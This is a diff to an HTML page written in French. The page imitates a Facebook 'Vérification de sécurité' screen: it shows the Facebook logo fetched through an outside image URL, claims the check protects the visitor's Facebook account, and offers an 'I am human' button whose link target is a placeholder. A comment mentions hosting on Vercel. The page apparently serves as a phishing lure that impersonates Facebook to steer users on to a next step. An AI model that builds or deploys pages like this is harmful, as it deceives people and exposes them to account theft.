@@ -1,7 +1,88 @@
-<p>&nbsp;</p>
-<div class="section" role="region" aria-label="V&eacute;rification de s&eacute;curit&eacute;">
-<div class="logo"><!-- Pour que l'image s'affiche sur Vercel, mets le fichier logo.png dans le même dossier que index.html --> <img src="https://th.bing.com/th/id/R.83fe295243ff34680905249adde05a0f?rik=6ZIQb5iYd8jjiA&amp;riu=http%3a%2f%2ffetchrss.com%2fimg%2fprov-logos%2ffacebook.png&amp;ehk=q5pf4YSNXtthE12%2fdVLUGIPgkN3KWW2aJPmfnNsAklU%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0" alt="Logo" width="500" height="97" /></div>
-<h3>🔐 V&eacute;rification de s&eacute;curit&eacute;</h3>
-<p>Pour continuer, nous devons v&eacute;rifier que vous n'&ecirc;tes pas un robot.<br /> Ce processus de v&eacute;rification prot&egrave;ge votre compte Facebook.</p>
-<div class="buttons"><a href="s"><button class="primary">Je suis un humain</button></a> <a href="x"><button class="secondary">❌ Fermer</button></a></div>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vérification de sécurité</title>
+<style>
+    * { box-sizing: border-box; }
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background-color: #f0f2f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+    }
+    .section {
+        background-color: #fff;
+        padding: 60px 50px;
+        border-radius: 12px;
+        box-shadow: 0 6px 25px rgba(0,0,0,0.2);
+        text-align: center;
+        width: 100%;
+        max-width: 1000px; /* Bloc très large */
+    }
+    .logo {
+        margin-bottom: 40px;
+    }
+    .logo img {
+        max-width: 100%;
+        height: auto;
+    }
+    h1, p {
+        margin: 10px 0;
+    }
+    h1 {
+        font-size: 2rem;
+    }
+    p {
+        font-size: 1.1rem;
+        line-height: 1.6;
+    }
+    .buttons a {
+        text-decoration: none;
+        margin: 0 10px;
+    }
+    button {
+        padding: 16px 40px;
+        font-size: 1.1rem;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        transition: 0.3s;
+    }
+    .primary {
+        background-color: #1877f2;
+        color: #fff;
+    }
+    .primary:hover {
+        background-color: #145dbf;
+    }
+    .secondary {
+        background-color: #e4e6eb;
+        color: #050505;
+    }
+    .secondary:hover {
+        background-color: #d8dadf;
+    }
+</style>
+</head>
+<body>
+<div class="section" role="region" aria-label="Vérification de sécurité">
+    <div class="logo">
+        <!-- Logo directement depuis l'URL -->
+        <img src="https://th.bing.com/th/id/R.83fe295243ff34680905249adde05a0f?rik=6ZIQb5iYd8jjiA&riu=http%3a%2f%2ffetchrss.com%2fimg%2fprov-logos%2ffacebook.png&ehk=q5pf4YSNXtthE12%2fdVLUGIPgkN3KWW2aJPmfnNsAklU%3d&risl=&pid=ImgRaw&r=0" alt="Logo" width="500" height="97">
+    </div>
+    <h1>🔐 Vérification de sécurité</h1>
+    <p>Pour continuer, nous devons vérifier que vous n'êtes pas un robot.<br>
+    Ce processus de vérification protège votre compte Facebook.</p>
+    <div class="buttons">
+        <a href="s"><button class="primary">Je suis un humain</button></a>
+        <a href="x"><button class="secondary">❌ Fermer</button></a>
+    </div>
 </div>
+</body>
+</html>
